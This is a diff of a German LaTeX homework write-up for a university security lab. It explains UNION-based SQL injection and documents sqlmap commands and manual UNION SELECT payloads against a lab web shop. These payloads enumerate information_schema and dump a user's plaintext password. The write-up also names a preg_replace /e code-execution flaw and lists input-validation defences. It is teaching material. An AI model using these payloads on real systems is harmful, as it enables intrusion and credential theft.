@@ -55,19 +55,25 @@
 
 \subsection*{a)}
 \begin{itemize}
-	\item Die \textit{Union} Klausel kann zum extrahieren von Daten benutzt werden. Das ursprüngliche Anfrage wird so abgeändert das ihre Ergebnisse oder Teilergebnisse mit den Ergebnissen einer anderen (vom Angreifer bestimmten) Abfrage vereint werden. Da die Ergebnisse nur vereint werden, bleibt die Struktur der resultierenden Tabelle gleich und die Anwendung gibt die Ergebnisse des durch \textit{Union} angehängten \textit{SELECT} Statements mit aus.
-	\item Wenn der Angreifer weiß, wie viele Spalten die eigentliche Anfrage hatte, kann er eine Injection zusammenstellen, die wieder genauso viele Spalten hat als Ergebnis. Dies ist wichtig, da die Daten aus den Anfragen selten direkt dem Nutzer gezeigt werden. Meistens werden sie noch durch eine Logik der Anwendung verarbeitet und aufbereitet. Wenn die Injection nun nicht die richtige Spaltenanzahl hat werden die meisten Anwendung die Darstellung abbrechen und nur einen Fehler zeigen. Wenn das Ziel des Angriffs eine Manipulation der Daten ist, kann dies ausreichen. Will der Angreifer aber Daten aus der Datenbank erhalten, will er diese auch angezeigt bekommen.
-	\item 
+	\item Die \textit{Union} Klausel kann zum extrahieren von Daten benutzt werden. Das ursprüngliche Anfrage wird so abgeändert, dass ihre Ergebnisse oder Teilergebnisse mit den Ergebnissen einer anderen (vom Angreifer bestimmten) Abfrage vereint werden. Da die Ergebnisse nur vereint werden, bleibt die Struktur der resultierenden Tabelle gleich und die Anwendung gibt die Ergebnisse des durch \textit{Union} angehängten \textit{SELECT} Statements mit aus.
+	\item Wenn der Angreifer weiß, wie viele Spalten die eigentliche Anfrage hatte, kann er eine Injection zusammenstellen, die wieder genauso viele Spalten als Ergebnis hat. Dies ist wichtig, da die \textit{Union} Klausel bei allen \textit{SELECT} anfragen die gleiche Anzahl an Spalten benötigt, um diese miteinander zu verbinden.
+
+Zusätzlich werden die Daten aus den Anfragen selten direkt dem Nutzer gezeigt. Meistens werden sie noch durch eine Logik der Anwendung verarbeitet und aufbereitet. Wenn die Injection nun nicht die richtige Spaltenanzahl hat werden die meisten Anwendung die Darstellung abbrechen und nur einen Fehler zeigen. Wenn das Ziel des Angriffs eine Manipulation der Daten ist, kann dies ausreichen. Will der Angreifer aber Daten aus der Datenbank erhalten, will er diese auch angezeigt bekommen.
+	\item Die Anwendung wird z.B. den ersten Eintrag der zurückgegebenen Tabelle als Information auf der Seite anzeigen lassen (was im Normalfall die korrekten Daten der Original-Anfrage sein sollten). Durch die \textit{Union} Klausel werden dem Ergebnis (also von SQL zurückgegebenen Tabelle) weitere Einträge eingefügt. Sollten diese z.B. an erster Stelle einsortiert worden sein, werden an Stelle der Daten aus der Original-Anfrage eben die Daten des Angreifers angezeigt.
+	
+Durch Umsortierung der zurückgegebenen Tabelle kann man so beliebige Einträge an die Stelle schieben, die auf der Seite angezeigt werden. Hierfür kann man z.B. den \textit{LIMIT} Befehl benutzen, so dass nur gewünschte Einträge im Ergebnis übrig bleiben und so von der Seite ausgewählt und angezeigt werden müssen. Hinter dem \textit{LIMIT} Befehl beendet man einfach die Anfrage durch Auskommentieren der übrigen Anfrage (z.B. mit \# oder -\,-).
 \end{itemize}
 
 \subsection*{b)}
-Zuerst im Browser mal auf den shop gehen und schauen, was er so macht. Man musste unten nmap oder wireshark auswählen und dann auf Details ansehen klicken. Hierdurch wurde man auf die Seite "`details\_tools.php"' weitergeleitet und bekommt ein paar daten über z.B. Wireshark.
+Wir sind zunächst mal im Browser mal auf den Shop gegangen und haben geschaut, was er überhaupt macht. Man musste unten Nmap oder Wireshark auswählen und dann auf "`Details ansehen"' klicken. Hierdurch wurde man auf die Seite "`details\_tools.php"' weitergeleitet und bekommt ein paar Daten über das ausgewählte Tool.
 
-Durch das Firefox-plugin Tamper Data konnten wir herausfinden, dass als Post dabei der wert tool=1 (für nmap) bzw tool=2 (für wireshark) übergeben werden. Dies können wir ausnutzen, um mit sqlmap die Datenbank(en) anzuschauen. Hierfür benutzen wir zunächst folgenden Befehl:
+Durch das Firefox-plugin "`Tamper Data"' konnten wir herausfinden, dass als Post beim Wechsel auf die "'details\_tools.php"' der wert tool=1 (für Nmap) bzw tool=2 (für Wireshark) übergeben werden. Dies können wir ausnutzen, um mit sqlmap die Datenbank(en) anzuschauen. Hierfür benutzen wir zunächst folgenden Befehl:
+
 \begin{verbatim}
 sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --tables
 \end{verbatim}
-Der gibt uns sowohl die vorhandenen Datenbanken, als auch die dazu gehörigen Tabellen:
+
+Dieser Befehl gibt uns sowohl die vorhandenen Datenbanken, als auch die dazu gehörigen Tabellen:
 
 \begin{verbatim}
 Database: webshop
@@ -151,35 +157,84 @@ Database: mysql
 +---------------------------------------+
 \end{verbatim}
 
-Die erste Datenbank (webshop) sah nicht wichtig für Benutzerdaten aus, da sie als Tabellen nur artikel und logs besaß. Die nächste Datenbank jedoch hieß secureuserdata und besaß eine tabelle accessdata.
-Diese tabelle haben wir zunächst nach Passwörtern durchsuchen lassen (mit dem --passwords befehl):\\
+Die erste Datenbank (webshop) sah nicht wichtig für Benutzerdaten aus, da sie als Tabellen nur "`artikel"' und "`logs"' besaß. Die nächste Datenbank jedoch hieß \textit{secureuserdata} und besaß eine Tabelle "`accessdata"'.
+Diese Tabelle haben wir zunächst nach Passwörtern durchsuchen lassen (mit dem -\,-passwords befehl):
 
-sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --passwords -D secureuserdata -T accessdata\\
+\begin{verbatim}
+sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --passwords
+-D secureuserdata -T accessdata
+\end{verbatim}
 
-Es gab einige Ergebnisse, allerdings keins, mit dem namen jack (sondern nur sowas wie root, phpmyadmin usw.). Da alle diese Passwörter gehashed waren haben wir die Tabelle einfach mal so via --dump Befehl ausgeben lassen. Dabei haben wir den user jack angegeben:\\
+Es gab einige Ergebnisse, allerdings keins mit dem Namen "`jack"' (sondern nur so etwas wie "`root"', "`phpmyadmin"' usw.). Da alle auf diese weise gefundenen Passwörter gehashed waren haben wir die Tabelle für weitere Hinweise einfach mal so via -\,-dump Befehl ausgeben lassen. Dabei haben wir den Benutzer "`jack"' angegeben:
 
-sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --dump -D secureuserdata -T accessdata -U jack\\
+\begin{verbatim}
+sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --dump -D
+secureuserdata -T accessdata -U jack
+\end{verbatim}
 
-Das Ergebnis war der Eintrag jack mit der id 3 und dem passwort london. Demnach wurde das Passwort wohl unverschlüsselt in der Tabelle abgelegt.
+Das Ergebnis war der Eintrag "`jack"' mit der id 3 und dem Passwort "`london"'. Demnach wurde das Passwort wohl unverschlüsselt in der Tabelle abgelegt.
 
 
-Alternative: direkt über die Internetseite Query's abschicken.
+Alternative: direkt über die Internetseite Query's abschicken (da wir SQL-Statements angeben sollten).
+
+Zunächst galt es herauszufinden, wie viele Spalten der Tabelle die ursprüngliche Anfrage aus der Datenbank abfragt, damit wir unseren UNION Befehl einbauen können. Durch einfaches Testen von UNION Injections mit verschiedener Spaltenanzahl bekamen wir Fehlermeldungen:
+
+\begin{verbatim}
+MySQL-Error: The used SELECT statements have a different number of columns
+\end{verbatim}
+
+Als wir mit 4 Spalten keine Meldung bekamen wussten wir, dass die original Abfrage also mit 4 Spalten ausgeführt wurde. Jetzt galt es herauszufinden, welche Typen in welchen Spalten benutzt wurden, da auch diese in dem UNION Befehl identisch sein müssen. Die erste Spalte war nicht richtig nachzuvollziehen und ergab keine Ausgabe, die zweite Spalte jedoch konnte mit einem String belegt werden und ergab eine Ausgabe beim Namen der Tool-Beschreibung. Den Rest der Spalten haben wir auf NULL gelassen.
+
+Jetzt konnten wir beginnen die "`information\_schema"' Tabelle zu benutzen und Datenbanken sowie Tabellen abzufragen. Den LIMIT Befehl benutzten wir, um die einzelnen Zeilen der Ausgabe durchlaufen zu können und ihren Inhalt ausgegeben zu bekommen. Wir begannen also mit:
+
+\begin{verbatim}
+'UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata LIMIT 0,1;#
+\end{verbatim}
+
+Das gab uns zunächst den Datenbank-Namen "`information\_schema"' aus. Wir testeten weiter, bis der Befehl:
+
 \begin{verbatim}
 'UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata LIMIT 2,1;#
+\end{verbatim}
 
+den gesuchten Datenbank-Namen "`secureuserdata"' als Name des Tool's ausgegeben hat. Diesen konnten wir für weitere Abfragen nutzen, z.B. zunächst, um die Tabellen in dieser Datenbank herauszubekommen:
+
+\begin{verbatim}
 'UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='secureuserdata';#
+\end{verbatim}
 
+Glücklicherweise gab uns diese Anfrage direkt den Namen "`accessdata"' zurück, so dass wir nicht lange mit dem LIMIT Befehl alle Einträge durchgehen mussten. Aus dieser Tabelle wollten wir jetzt die einzelnen Spalten abfragen, die zur Verfügung stehen:
+
+\begin{verbatim}
 'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 1,1;#
-user
-'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 2,1;#
-password
+\end{verbatim}
 
-'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata LIMIT 1,1;#
+ergab die Spalte "`user"', und:
+
+\begin{verbatim}
+'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 2,1;#
+\end{verbatim}
+
+ergab die Spalte "`password"'. Hiermit wussten wir, dass in dieser Tabelle also die Passwörter der einzelnen Benutzer gespeichert wurden. Da wir den Benutzer "`jack"' suchten, haben wir einfach mal den Befehl:
+
+\begin{verbatim}
 'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata WHERE user='jack';#
 \end{verbatim}
 
+eingegeben, und siehe da, als Tool Name erschien der Benutzer "`jack"' und als Tool Beschreibung sein Passwort "`london"'. Alternativ hätten wir auch die einzelnen Tabelleneinträge wieder mit dem Limit Befehl durchgehen können, wie z.B.:
+
+\begin{verbatim}
+'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata LIMIT 1,1;#
+\end{verbatim}
+
+das Ergebnis für den Benutzer "`paul"' gewesen wäre.
+
 
 \subsection*{c)}
+
+Maßnahmen für die Sicherung des Shops gegen solche Angriffe wie in Teil b) wären einfach gewesen, wenn man die Werte, die über POST an die "`details\_tools.php"' Seite gegeben wurden, überprüft hätte. So hätte man z.B. alle ' Zeichen (oder für andere Angriffe auch weitere Sonderzeichen) escapen können. Hierfür gibt es in php bereits vorgefertigte Befehle, falls man das nicht per Hand machen will (wäre aber auch sicherer, um nichts zu vergessen).
+
+In diesem Szenario wird allerdings auch einzig und allein der Wert 1 bzw. 2 für den Parameter "`tool"' übergeben. Selbst bei mehr als nur den 2 Tools wäre in diesem Parameter nur eine Zahl erlaubt, so dass man alle ungültigen Zeichen, also alles, was keine Zahl ist, hätte entfernen können, oder dann die gesamte Abfrage verworfen worden sein könnte, bevor sie als wirkliche SQL-Anfrage an die Datenbank gegangen wäre.
 
 \section*{Aufgabe 2}
 
@@ -224,5 +279,5 @@ Eine Möglichkeit die Ausbreitungsgeschwindigkeit zu reduzieren wäre die Nachri
 
 \section*{Aufgabe 3}
 
-Der Leetspeakgenerator enthält eine Sicherheitslücke in der 1337.php. Die verwendete Funktion preg_replace, die in Zeile 16 mit dem Modifikator "\textit{e}" aufgerufen wird, kann dazu ausgenutzt werden. Damit wir einfacher auf 1337.php Datei zugreifen konnten, benutzten wir einen RESTClient und bauten die Anfrage an die 1337.php nach. 
+Der Leetspeakgenerator enthält eine Sicherheitslücke in der 1337.php. Die verwendete Funktion preg\_replace, die in Zeile 16 mit dem Modifikator "`\textit{e}"' aufgerufen wird, kann dazu ausgenutzt werden. Damit wir einfacher auf 1337.php Datei zugreifen konnten, benutzten wir einen RESTClient und bauten die Anfrage an die 1337.php nach. 
 \end{document}
